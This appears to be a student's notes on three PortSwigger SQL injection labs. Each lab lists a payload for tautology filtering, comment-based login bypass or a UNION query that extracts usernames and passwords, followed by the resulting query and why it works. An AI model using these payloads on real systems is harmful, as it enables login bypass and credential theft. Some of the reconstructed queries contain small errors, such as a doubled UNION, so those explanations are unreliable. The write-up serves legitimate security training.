# SQL-Injection tests

Note: All the following labs/exercises are performed using the **Burp Suite**.  
Download it at you convenience from https://portswigger.net/

## Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
Link: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
Payload: **'+OR+1=1--**
Query produced: "SELECT ....WHERE category = Lifestyle OR 1=1"
It works because: the where clause evaluates to TRUE regardless of category, since 1=1 is always true (boolean algebra)

## Lab 2  - SQLi vulnerability allowing login bypass  
Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass  
Payload: **administrator'--**
Assumption(s):  
- username = administrator
Query produced: SELECT * from users WHERE username = 'administrator'
It works because: this hack efficiently removed the need of a correct password (bypassing it completely)

## Lab 3 - SQLi UNION attack, retrieving data from other tables
Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables  
Payload: **'+UNION+SELECT+username,+password+FROM+users--**  
Assumption(s):
- there is a users table with 2 columns (username, password) we try to get data from (alongside the normal data comming from the original select with a category = gifts)
Query produced: SELECT * from products WHERE category=gifts UNION UNION SELECT username, password FROM users
It works because: this hack exposes user data togther with normal data from the products category.  
Note: We need first to find out the number of columns that the original query fetched using "null":s until the server stoped responding with an error (as in **'+UNION+SELECT+null,null--**). After that we need to find out if the types of our columns match (are similar). Finally, we make a qualified guess and try with the payload above.

